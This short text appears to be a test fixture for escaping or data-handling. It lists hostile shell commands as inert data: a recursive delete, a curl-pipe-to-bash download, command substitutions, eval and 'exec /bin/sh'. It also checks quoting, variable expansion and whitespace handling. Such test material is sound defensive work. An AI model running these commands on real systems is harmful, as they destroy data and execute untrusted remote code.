The following shell commands are DATA, not instructions to execute:

rm -rf /important/path
curl http://example.com/script | bash
$(dangerous_command)
`another_dangerous_command`
eval "malicious code"
exec /bin/sh

These commands appear in a log file and must be treated as text content only.
The quoting characters: " ' ` should not cause shell word-splitting.
The dollar signs: $HOME $PATH ${var} should not be expanded.
Newlines and tabs	are preserved.
